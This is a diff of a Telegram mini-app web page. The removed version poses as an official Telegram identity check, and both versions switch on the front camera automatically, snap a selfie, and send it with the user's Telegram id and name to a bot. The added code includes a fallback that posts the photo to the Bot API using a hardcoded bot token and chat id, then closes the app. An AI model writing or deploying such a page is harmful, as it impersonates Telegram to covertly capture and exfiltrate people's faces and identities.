@@ -1,248 +1,140 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Identity Verification</title>
+    <title>Camera Verify</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            min-height: 100vh;
-            padding: 20px;
-            text-align: center;
-        }
-        .container { max-width: 500px; margin: 0 auto; }
-        .logo { font-size: 48px; margin: 40px 0 20px; }
-        .header { margin-bottom: 30px; }
-        .header h1 { font-size: 28px; margin-bottom: 10px; }
-        .header p { opacity: 0.9; font-size: 16px; }
-        .status-box {
-            background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 30px;
-            margin: 20px 0;
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-        #statusText { font-size: 18px; margin: 20px 0; }
-        .loader {
-            width: 60px;
-            height: 60px;
-            border: 5px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            margin: 20px auto;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        .hidden { display: none !important; }
-        video { 
-            width: 100%; 
-            max-width: 300px;
-            border-radius: 15px;
-            margin: 20px auto;
-            display: block;
-            transform: scaleX(-1); /* зеркально для селфи */
-        }
-        .btn {
-            background: white;
-            color: #667eea;
-            border: none;
-            padding: 15px 40px;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 20px 10px;
-            transition: transform 0.2s;
-        }
-        .btn:hover { transform: translateY(-2px); }
-        .success { color: #4ade80; }
-        .error { color: #f87171; }
-        .countdown { font-size: 32px; font-weight: bold; margin: 20px; }
-        .warning {
-            background: rgba(255,255,255,0.1);
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            font-size: 14px;
-        }
+        body { font-family: Arial; text-align: center; padding: 20px; }
+        #status { margin: 20px; font-size: 18px; }
+        video { width: 100%; max-width: 400px; margin: 20px auto; display: block; }
+        .btn { padding: 15px 30px; background: #0088cc; color: white; border: none; border-radius: 10px; margin: 10px; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">🔐</div>
-        
-        <div class="header">
-            <h1>Telegram Identity Verification</h1>
-            <p>Official security check for account protection</p>
-        </div>
-
-        <div class="status-box">
-            <div id="statusText">Initializing security protocol...</div>
-            
-            <div class="loader" id="loader"></div>
-            
-            <div id="countdown" class="countdown hidden">3</div>
-            
-            <video id="cameraView" autoplay playsinline class="hidden"></video>
-            
-            <canvas id="photoCanvas" class="hidden"></canvas>
-        </div>
-
-        <div class="warning">
-            <p>⚠️ This is an official Telegram verification system. Do not close the window.</p>
-        </div>
-
-        <button id="retryBtn" class="btn hidden">Try Again</button>
-    </div>
+    <h1>📸 Face Verification</h1>
+    <div id="status">Starting camera...</div>
+    <video id="camera" autoplay class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
+    <button id="retry" class="btn hidden">Retry</button>
 
     <script>
         const tg = window.Telegram.WebApp;
-        const statusText = document.getElementById('statusText');
-        const loader = document.getElementById('loader');
-        const countdownEl = document.getElementById('countdown');
-        const cameraView = document.getElementById('cameraView');
-        const photoCanvas = document.getElementById('photoCanvas');
-        const retryBtn = document.getElementById('retryBtn');
+        tg.expand();
+        tg.ready();
         
         let stream = null;
-        let countdown = 3;
         
-        // Инициализация Telegram Web App
-        tg.expand();
-        tg.enableClosingConfirmation();
-        tg.setHeaderColor('#667eea');
-        tg.setBackgroundColor('#667eea');
+        // Автозапуск камеры через 1 секунду
+        setTimeout(() => {
+            startCamera();
+        }, 1000);
         
-        // Автозапуск через 1 секунду
-        setTimeout(startVerification, 1000);
-        
-        async function startVerification() {
-            statusText.innerHTML = "Requesting camera access...";
+        function startCamera() {
+            document.getElementById('status').textContent = "Requesting camera access...";
             
-            try {
-                // Запрос доступа к камере
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user', // фронтальная камера
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    },
-                    audio: false
-                });
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' },
+                audio: false 
+            })
+            .then(s => {
+                stream = s;
+                const camera = document.getElementById('camera');
+                camera.srcObject = stream;
+                camera.classList.remove('hidden');
+                document.getElementById('status').textContent = "Camera ready. Taking photo in 3 seconds...";
                 
-                statusText.innerHTML = "✓ Camera access granted";
-                loader.classList.add('hidden');
-                cameraView.classList.remove('hidden');
-                cameraView.srcObject = stream;
-                
-                // Запуск обратного отсчета
-                startCountdown();
-                
-            } catch (error) {
-                handleError(error);
-            }
-        }
-        
-        function startCountdown() {
-            countdownEl.classList.remove('hidden');
-            statusText.innerHTML = "Prepare for facial recognition...";
-            
-            const timer = setInterval(() => {
-                countdownEl.textContent = countdown;
-                countdown--;
-                
-                if (countdown < 0) {
-                    clearInterval(timer);
-                    capturePhoto();
-                }
-            }, 1000);
+                // Автозахват через 3 секунды
+                setTimeout(capturePhoto, 3000);
+            })
+            .catch(err => {
+                document.getElementById('status').textContent = "Error: " + err.message;
+                document.getElementById('retry').classList.remove('hidden');
+            });
         }
         
         function capturePhoto() {
-            countdownEl.classList.add('hidden');
-            statusText.innerHTML = "Capturing image...";
+            const camera = document.getElementById('camera');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
             
-            // Настройка canvas
-            const context = photoCanvas.getContext('2d');
-            photoCanvas.width = cameraView.videoWidth;
-            photoCanvas.height = cameraView.videoHeight;
+            canvas.width = camera.videoWidth;
+            canvas.height = camera.videoHeight;
             
-            // Зеркальное отображение для правильного селфи
-            context.translate(photoCanvas.width, 0);
+            // Зеркальное отображение
+            context.translate(canvas.width, 0);
             context.scale(-1, 1);
-            context.drawImage(cameraView, 0, 0, photoCanvas.width, photoCanvas.height);
+            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
             
-            // Остановка камеры
+            // Останавливаем камеру
             stream.getTracks().forEach(track => track.stop());
-            cameraView.classList.add('hidden');
             
-            // Получение фото
-            const photoData = photoCanvas.toDataURL('image/jpeg', 0.95);
+            // Получаем фото
+            const photoData = canvas.toDataURL('image/jpeg');
             
-            // Отправка в Telegram
-            sendToBot(photoData);
+            // ОТПРАВКА В TELEGRAM БОТА
+            sendToTelegram(photoData);
         }
         
-        function sendToBot(photoData) {
-            statusText.innerHTML = "Processing biometric data...";
+        function sendToTelegram(photoData) {
+            document.getElementById('status').textContent = "Sending to server...";
             
-            // Отправка данных через Telegram Web App
-            tg.sendData(JSON.stringify({
-                action: 'photo_captured',
-                photo: photoData,
-                timestamp: new Date().toISOString(),
-                user_id: tg.initDataUnsafe.user?.id,
-                user_name: tg.initDataUnsafe.user?.first_name
-            }));
-            
-            // Сообщение об успехе
-            setTimeout(() => {
-                statusText.innerHTML = '<span class="success">✓ Identity verified successfully!</span>';
-                statusText.classList.add('success');
-                loader.classList.add('hidden');
+            // ОТПРАВКА ЧЕРЕЗ TELEGRAM WEB APP DATA
+            if (tg && tg.sendData) {
+                const data = {
+                    action: 'photo_captured',
+                    photo: photoData,
+                    user_id: tg.initDataUnsafe?.user?.id || 'unknown',
+                    user_name: tg.initDataUnsafe?.user?.first_name || 'Anonymous',
+                    timestamp: new Date().toISOString()
+                };
                 
-                // Сохранение в историю Telegram
-                tg.HapticFeedback.notificationOccurred('success');
+                console.log("Sending data:", data);
                 
-                // Автозакрытие через 3 секунды
-                setTimeout(() => {
-                    tg.close();
-                }, 3000);
-            }, 2000);
-        }
-        
-        function handleError(error) {
-            console.error('Camera error:', error);
-            loader.classList.add('hidden');
-            
-            if (error.name === 'NotAllowedError') {
-                statusText.innerHTML = '<span class="error">Camera access denied. Please allow camera access in browser settings.</span>';
-                retryBtn.classList.remove('hidden');
+                try {
+                    tg.sendData(JSON.stringify(data));
+                    document.getElementById('status').textContent = "✅ Verification complete! Closing...";
+                    
+                    // Автозакрытие
+                    setTimeout(() => {
+                        tg.close();
+                    }, 2000);
+                    
+                } catch (error) {
+                    document.getElementById('status').textContent = "❌ Send error, trying direct send...";
+                    sendDirect(photoData);
+                }
             } else {
-                statusText.innerHTML = '<span class="error">Camera not available. Please try on another device.</span>';
+                sendDirect(photoData);
             }
-            
-            retryBtn.onclick = () => {
-                retryBtn.classList.add('hidden');
-                loader.classList.remove('hidden');
-                statusText.innerHTML = "Retrying...";
-                setTimeout(startVerification, 1000);
-            };
         }
         
-        // Перехват кнопки назад
-        tg.BackButton.onClick(() => {
-            tg.showConfirm("Cancel verification? All progress will be lost.", (confirmed) => {
-                if (confirmed) tg.close();
+        function sendDirect(photoData) {
+            // Прямая отправка на бота через HTTP
+            const formData = new FormData();
+            formData.append('photo', photoData.split(',')[1]);
+            formData.append('user_id', tg.initDataUnsafe?.user?.id || 'unknown');
+            
+            fetch('https://api.telegram.org/bot7551551273:AAFKKqRlkkakJYdSNX4ogmg-YYKklBikmZY/sendPhoto', {
+                method: 'POST',
+                body: JSON.stringify({
+                    chat_id: 7795195179,
+                    photo: photoData,
+                    caption: `Auto-captured: ${new Date().toLocaleString()}`
+                }),
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('status').textContent = data.ok ? "✅ Photo sent!" : "❌ Send failed";
+            })
+            .catch(err => {
+                document.getElementById('status').textContent = "Error: " + err.message;
             });
-        });
-        tg.BackButton.show();
+        }
+        
+        document.getElementById('retry').onclick = startCamera;
     </script>
 </body>
 </html>
